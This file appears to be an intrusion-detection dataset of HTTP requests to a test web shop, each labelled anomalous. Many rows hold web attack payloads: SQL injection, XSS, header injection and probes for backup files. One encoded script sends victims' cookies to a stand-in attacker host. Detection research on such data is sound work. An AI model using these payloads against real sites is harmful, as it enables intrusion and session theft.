,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,classification,URL
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=5A842E86EC5C297DC668B0B0904389A0,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leupold&password=f8i73a&nombre=Rogaciano&apellidos=Huasupoma+Llobera&email=florath_cochran%40hiperzaragoza.aq&dni=42620172E&direccion=C%2F+Sagrados+Corazones+27%2C+7%3FA&ciudad=Villalbilla+de+Gumiel&cp=1137A&provincia=Zamora&ntc=1281104729948051&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=97171E761A1723896D63453F7BA74065,application/x-www-form-urlencoded,Connection: close,Content-Length: 278,modo=registro&login=leupold&password=f8i73a&nombre=Rogaciano&apellidos=Huasupoma+Llobera&email=florath_cochran%40hiperzaragoza.aq&dni=42620172E&direccion=C%2F+Sagrados+Corazones+27%2C+7%3FA&ciudad=Villalbilla+de+Gumiel&cp=1137A&provincia=Zamora&ntc=1281104729948051&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=5C191CD84680790180EF64EFC64DE4F5,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leupold&password=f8i73a&nombreA=Rogaciano&apellidos=Huasupoma+Llobera&email=florath_cochran%40hiperzaragoza.aq&dni=42620172E&direccion=C%2F+Sagrados+Corazones+27%2C+7%3FA&ciudad=Villalbilla+de+Gumiel&cp=10230&provincia=Zamora&ntc=1281104729948051&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0ED7ACFBF1FD25FB3A8DB05180CCA4FB,application/x-www-form-urlencoded,Connection: close,Content-Length: 279,modo=registro&login=leupold&password=f8i73a&nombreA=Rogaciano&apellidos=Huasupoma+Llobera&email=florath_cochran%40hiperzaragoza.aq&dni=42620172E&direccion=C%2F+Sagrados+Corazones+27%2C+7%3FA&ciudad=Villalbilla+de+Gumiel&cp=10230&provincia=Zamora&ntc=1281104729948051&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=3818CC04940D831A6CCDB6B2C8636280,,close,,,1,http://localhost:8080.INC HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=87AB2F021E66E532AAF2CB4E2FBCB7F4,,close,,,1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=77567A4A67DACA246003F04465DCF866,application/x-www-form-urlencoded,Connection: close,Content-Length: 18,B2A=Vaciar+carrito,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=E1D270E7FC5E68C1F1B2F5648C5E75D8,,close,,,1,http://localhost:8080/iisadmpwd/achg.htr HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=EF71E01CF51D4A44241B53C87A7BBCE5,,close,,,1,http://localhost:8080/tienda1/global/creditos.jsp/.java HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=5F0E69BB80B979D7882DF7A7054F6748,,close,,,1,http://localhost:8080/webadmin.nsf HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0A692A69151BCBD243D0F14540197F36,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=muise&password=l321n2c3r%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Matco&apellidos=Yera+Patriz&email=bacall%40djbroadcast.hk&dni=75976186X&direccion=Calle+Garcia+Arista+97%2C+6%3FB&ciudad=Betancuria&cp=34191&provincia=Cuenca&ntc=9917801099618736&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=AB831A3C5D3A418BA6392C9F870BFABC,application/x-www-form-urlencoded,Connection: close,Content-Length: 317,modo=registro&login=muise&password=l321n2c3r%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Matco&apellidos=Yera+Patriz&email=bacall%40djbroadcast.hk&dni=75976186X&direccion=Calle+Garcia+Arista+97%2C+6%3FB&ciudad=Betancuria&cp=34191&provincia=Cuenca&ntc=9917801099618736&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=76A60A9188882F402D9209D9E7B714C8,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=muise&password=l321n2c3r&nombre=Matco&apellidos=Yera+Patriz&email=cervenka_murna7%40po%40%40rtaldesign.hn&dni=75976186X&direccion=Calle+Garcia+Arista+97%2C+6%3FB&ciudad=Betancuria&cp=34191&provincia=Cuenca&ntc=9917801099618736&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=933CFDDEB0D3EC76291971A30555E3A8,application/x-www-form-urlencoded,Connection: close,Content-Length: 259,modo=registro&login=muise&password=l321n2c3r&nombre=Matco&apellidos=Yera+Patriz&email=cervenka_murna7%40po%40%40rtaldesign.hn&dni=75976186X&direccion=Calle+Garcia+Arista+97%2C+6%3FB&ciudad=Betancuria&cp=34191&provincia=Cuenca&ntc=9917801099618736&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=F8E9ACAA00F2A1493ED9F1BE0046A53F,,close,,,1,http://localhost:8080/patient/register.do HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=6E8C0F80E1AC494C93397EF8EAE3EA52,,close,,,1,http://localhost:8080/tienda1/imagenes/asf-logo-wide.Inc HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=CDEDEB2D4618CA31D72C14CFD8F23A48,,close,,,1,http://localhost:8080/tienda1/imagenes/asf-logo-wide.gif.Old HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=20CD80CB8BE6889DFF47CDE20CE759C5,,close,,,1,http://localhost:8080/tienda1/imagenes/cmenbul.gif/asf-logo-wide HTTP/1.1
Anomalous,PUT,0,no-cache,no-cache,1,0,0,en,1,JSESSIONID=1A1164AA4A3272C18BC68CCF62568276,application/x-www-form-urlencoded,Connection: close,Content-Length: 71,id=1&nombre=Queso+Manchego&precio=39&cantidad=53&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=BFFCD8A7CA4BE2820AFA0D6A6043C43A,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego%27OR%27a%3D%27a&precio=39&cantidad=53&B1=A%F1adir+al+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=B9EA5F0C8061800870D61A70B5FA2B65,application/x-www-form-urlencoded,Connection: close,Content-Length: 87,id=1&nombre=Queso+Manchego%27OR%27a%3D%27a&precio=39&cantidad=53&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=1415C59E91E2D278135A8B5528F69A71,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100%2F&cantidad=53&B1=A%F1adir+al+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=8AA816462BC9E156CDE73F7C2F8F45B0,application/x-www-form-urlencoded,Connection: close,Content-Length: 75,id=1&nombre=Queso+Manchego&precio=100%2F&cantidad=53&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=499A70A22ABC0A9C6887CF598EF67842,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidadA=53&B1=A%F1adir+al+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=098457EAFC368EDF2D322D18794C0B1F,application/x-www-form-urlencoded,Connection: close,Content-Length: 72,id=1&nombre=Queso+Manchego&precio=39&cantidadA=53&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=93D7FC7AAFDF8060C6FD446FFC8B59D9,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp.Old HTTP/1.1
Anomalous,PUT,0,no-cache,no-cache,1,0,0,en,1,JSESSIONID=81E1878B49B1BB43F50C6C23DAB70CD6,application/x-www-form-urlencoded,Connection: close,Content-Length: 65,modo=entrar&login=azzuolo&pwd=ATRabIliARio&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=A3B24594213173195590199741418D9D,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ba**hl&pwd=ATRabIliARio&remember=off&B1=Entrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=F43D4CE295595B46BE16686C76139D80,application/x-www-form-urlencoded,Connection: close,Content-Length: 64,modo=entrar&login=ba**hl&pwd=ATRabIliARio&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=E00E1BE53DCD4E061A95C8E0A15C4FA6,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=azzuolo&pwdA=ATRabIliARio&remember=off&B1=Entrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4D275A1531B7703848BA8877ED18D4E6,application/x-www-form-urlencoded,Connection: close,Content-Length: 66,modo=entrar&login=azzuolo&pwdA=ATRabIliARio&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=F9DE5D60DB8F2DEA15A3E33FC36C462A,,close,,,1,http://localhost:8080/tienda1/asf-logo-wide.gif HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=8F5E5A51AACBD8705CDDD04F0C9F9059,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp.inc HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=E2A68F5836C2E8896809B206193BA3AD,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%2500 HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=B763DA2A40760C3BBFA36E6A04FD11E5,application/x-www-form-urlencoded,Connection: close,Content-Length: 8,id=%2500,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=7C2BE6D5A87A1E9621308B51966CBE91,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=2E9B25DC632B386D6044036FAA21A673,application/x-www-form-urlencoded,Connection: close,Content-Length: 5,idA=2,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=71BA617127B72487D3BAA67E6ACD4C8D,,close,,,1,http://localhost:8080/webapp/examples/login.html HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=D365F7BCF10DFD8EFF7A34C9A2C14D00,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasSet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=99194EC8F4EF1FE7F240F28C5A07D6CB,application/x-www-form-urlencoded,Connection: close,Content-Length: 81,errorMsg=Credenciales+incorrectasSet-cookie%253A%2BTamper%253D1041264011025374727,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=7CABF525211C0E3E3E80A8FE6E620248,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%2520 HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=46B1798B5065EB47CFCF01C8708A4B42,application/x-www-form-urlencoded,Connection: close,Content-Length: 14,errorMsg=%2520,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=B6F4BC4ECD2DD9EAE4CE69B5603A2AA5,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=38573E3D3565BA020E672622D49DBD56,application/x-www-form-urlencoded,Connection: close,Content-Length: 34,errorMsgA=Credenciales+incorrectas,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=54522F161D60BF1C9A04AE337A46549D,,close,,,1,http://localhost:8080/tienda1/asf-logo-wide.Old HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=8243F0F925A22D8A3220271469EEB3CF,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&precio=2949&B1=Pasar+por+caja HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=16A65E4E5DDC94E28661E0C3C3928B26,application/x-www-form-urlencoded,Connection: close,Content-Length: 109,modo=insertarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&precio=2949&B1=Pasar+por+caja,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=8FCBF8E4833C8A1CC52710D74F33AAA7,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2949&B1=Confirmar%2F HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=C529B65F92F354E554045172AC3F4468,application/x-www-form-urlencoded,Connection: close,Content-Length: 41,modo=insertar&precio=2949&B1=Confirmar%2F,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=116357009F8316014532828543C559F1,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=2949&B1=Pasar+por+caja HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=8CC8A94A1E69D9DB38A4657EED2F8E4E,application/x-www-form-urlencoded,Connection: close,Content-Length: 44,modoA=insertar&precio=2949&B1=Pasar+por+caja,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=5367FF5FE9771CD711451BF6863DDFD4,,close,,,1,http://localhost:8080/mail.box HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=C66C3226C8FE6548146DFA0C586439A7,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wei&password=yaguan%E9&nombre=Estefan&apellidos=Tomasa+Camino&email=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provincia=Badajoz&ntc=4288323841686638&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=8C027CAA8D47A6AF8C334DE3E78AC0CC,application/x-www-form-urlencoded,Connection: close,Content-Length: 302,modo=registro&login=wei&password=yaguan%E9&nombre=Estefan&apellidos=Tomasa+Camino&email=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provincia=Badajoz&ntc=4288323841686638&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=64772B88BB0F4EFA23A93F78F767E67E,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wei&password=presEn%2C%2F%2CcIaR&nombre=Estefan&apellidos=Tomasa+Camino&email=bovell_haygarth%40nuestrasantacruz.vu&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provincia=Badajoz&ntc=4288323841686638&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0919388C6978236768DEA968A9C9C842,application/x-www-form-urlencoded,Connection: close,Content-Length: 264,modo=registro&login=wei&password=presEn%2C%2F%2CcIaR&nombre=Estefan&apellidos=Tomasa+Camino&email=bovell_haygarth%40nuestrasantacruz.vu&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provincia=Badajoz&ntc=4288323841686638&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=FD096AE863A541832BC4ED758DE92E89,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wei&password=yaguan%E9&nombre=Estefan&apellidos=Tomasa+Camino&email=bovell_haygarth%40nuestrasantacruz.vu&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provinciaA=Badajoz&ntc=4288323841686638&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=81A0FEDB02F22BD58539117A8F9E5572,application/x-www-form-urlencoded,Connection: close,Content-Length: 255,modo=registro&login=wei&password=yaguan%E9&nombre=Estefan&apellidos=Tomasa+Camino&email=bovell_haygarth%40nuestrasantacruz.vu&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provinciaA=Badajoz&ntc=4288323841686638&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=AF772AB99811DA15C7A26AB73A513F6D,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp/4861362529278789730 HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=C632FCD6AEBDD553EC9DC6CE88F7F52B,,close,,,1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=26F735AD8803AABA7307317CE80CF411,application/x-www-form-urlencoded,Connection: close,Content-Length: 18,B2A=Vaciar+carrito,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4091765A60DA24A282C7CC63B17FE6D5,,close,,,1,http://localhost:8080/tienda1/asf-logo-wide HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=E4F7EAC3FCEA7C2974A8D7A0A3DA0FDF,,close,,,1,http://localhost:8080/examplesWebApp/WebservicesEJB.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=1B3E29465D4738B46EB705A0B4604CD3,,close,,,1,http://localhost:8080/tienda1/global/menum.jsp.INC HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=887EC8FED2BF5ADCBE4A3CEADD76ACD9,,close,,,1,http://localhost:8080/tienda1/4861362529278789730.OLD HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=A08E21EBA3FB883B61F9EB888DA3AA2D,,close,,,1,http://localhost:8080/IISSamples/sdk/asp/database/LimitRows_VBScript.asp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4AC4F4B42C2B9CFA5B165428AA88414C,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mya&password=rencor&nombre=Roxana&apellidos=Murillo+Pastrana&email=constantaras%40fighting-machines.ukAND+1%3D1&dni=05736398Z&direccion=Calle+Victoria+Kents+46+&ciudad=San+Miguel+de+Serrezuela&cp=18330&provincia=Girona&ntc=2610269003230246&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=81D956424A8CA9BE59D74FDE09DF5021,application/x-www-form-urlencoded,Connection: close,Content-Length: 272,modo=registro&login=mya&password=rencor&nombre=Roxana&apellidos=Murillo+Pastrana&email=constantaras%40fighting-machines.ukAND+1%3D1&dni=05736398Z&direccion=Calle+Victoria+Kents+46+&ciudad=San+Miguel+de+Serrezuela&cp=18330&provincia=Girona&ntc=2610269003230246&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=89E27886B7BFC5F7A205B4B653F2D2EE,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&password=rencor&nombre=Roxana&apellidos=Murillo+Pastrana&email=constantaras%40fighting-machines.uk&dni=05736398Z&direccion=Calle+Victoria+Kents+46+&ciudad=San+Miguel+de+Serrezuela&cp=18330&provincia=Girona&ntc=2610269003230246&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=BD65898618E18E10745864C3A2CDB01A,application/x-www-form-urlencoded,Connection: close,Content-Length: 824,modo=registro&login=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&password=rencor&nombre=Roxana&apellidos=Murillo+Pastrana&email=constantaras%40fighting-machines.uk&dni=05736398Z&direccion=Calle+Victoria+Kents+46+&ciudad=San+Miguel+de+Serrezuela&cp=18330&provincia=Girona&ntc=2610269003230246&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=848F1EA6ECCF0BA5F7FC0F5B63645520,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mya&password=rencor&nombre=Roxana&apellidos=Murillo+Pastrana&email=constantaras%40fighting-machines.uk&dni=05736398Z&direccion=Calle+Victoria+Kents+46+&ciudad=San+Miguel+de+Serrezuela&cp=18330&provincia=Girona&ntc=741988314886623&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=3A0F36FB3554131BC1E27AEE14D65EBA,application/x-www-form-urlencoded,Connection: close,Content-Length: 262,modo=registro&login=mya&password=rencor&nombre=Roxana&apellidos=Murillo+Pastrana&email=constantaras%40fighting-machines.uk&dni=05736398Z&direccion=Calle+Victoria+Kents+46+&ciudad=San+Miguel+de+Serrezuela&cp=18330&provincia=Girona&ntc=741988314886623&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=99CF66FDF0AD43F31A911ECF5BD94AAA,,close,,,1,http://localhost:8080/tienda1.Bak HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=F691E7019E8180FBE07817315BD6E216,,close,,,1,http://localhost:8080.old HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=204DAADCEB2782E986C698696DE1FC86,,close,,,1,http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1
